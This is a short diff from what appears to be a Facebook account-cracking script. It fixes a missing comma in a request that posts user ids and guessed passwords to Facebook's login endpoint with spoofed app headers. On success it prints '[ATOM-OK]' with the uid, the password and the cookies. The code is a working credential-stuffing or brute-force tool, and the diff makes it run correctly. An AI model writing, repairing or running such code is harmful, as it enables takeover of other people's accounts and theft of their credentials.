@@ -421,7 +421,7 @@ def _M2_(ids,pasx):
     'X-FB-Server-Cluster': 'True',
     'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                         url1= 'https://graph.facebook.com/auth/login'
-                        BLACK=session.post(url1,data=data, headers=head allow_redirects = False, verify = True).json()
+                        BLACK=session.post(url1,data=data, headers=head, allow_redirects = False, verify = True).json()
                         if 'access_token' in BLACK:
                                 uid = BLACK["uid"]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps} | {ckkk}')
